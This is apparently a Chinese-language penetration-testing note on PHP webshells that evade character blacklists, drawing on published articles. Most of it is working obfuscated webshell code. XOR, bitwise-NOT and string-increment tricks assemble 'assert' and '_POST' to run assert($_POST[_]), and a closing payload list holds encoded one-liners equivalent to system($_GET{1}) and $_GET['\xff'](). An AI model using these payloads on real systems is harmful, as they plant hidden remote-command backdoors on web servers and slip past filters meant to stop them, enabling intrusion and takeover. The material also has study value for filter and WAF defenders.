# webshell绕过黑名单

根据p牛写的文章总结+上自己的一些发现

 https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html 

 https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html 

 https://xz.aliyun.com/t/5677 



## php特性

1. Php的经典特性“Use of undefined constant”，会将代码中没有引号的字符都自动作为字符串，7.2开始提出要被废弃，不过目前还存在着 

2. 字符串++,会改变字符串的最后一个字符
3. 两个字符串位操作,会按顺序进行位操作,若长度不同,最终长度和短的那个相同





## 思路

1. 确认可用字符，通过变换得到新的字符

2. 利用其它环境来实现命令执行



## 收集可用字符

`print([])=>Array`

`print((100000000000000000){3})=>E`

`''=='' =>true=>1`





## 变换方法

### 位运算符

通过一系列运算将某个字符转为其他字符



(~%8F%97%8F%96%91%99%90)()=>phpinfo()



也可以通过 利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如`'和'{2}`的结果是`"\x8c"`，其取反即为字母`s` 



p牛的例子

```php
<?php
$__=('>'>'<')+('>'>'<');
$_=$__/$__;

$____='';
$___="瞰";$____.=~($___{$_});$___="和";$____.=~($___{$__});$___="和";$____.=~($___{$__});$___="的";$____.=~($___{$_});$___="半";$____.=~($___{$_});$___="始";$____.=~($___{$__});

$_____='_';$___="俯";$_____.=~($___{$__});$___="瞰";$_____.=~($___{$__});$___="次";$_____.=~($___{$_});$___="站";$_____.=~($___{$_});

$_=$$_____;
$____($_[$__]);
```

```php
<?php
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // $_='assert';
$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__='_POST';
$___=$$__;
$_($___[_]); // assert($_POST[_]);
```



还有一个就是目录下的字符合成



### ++$a

`$a='b';$a++;print($a)`=>c

利用`[]`来生成Array,来获得字符

```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E 
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```





## payload收集

```php
$pi=base_convert;$pi(1751504350,10,36)(${$pi(1115654,10,36)^((100).(1))}{1});
#system($_GET{1})
${%A0%B8%BA%AB^%ff%ff%ff%ff}{%ff}();#urldecode一下
#$_GET['\xff']();

```

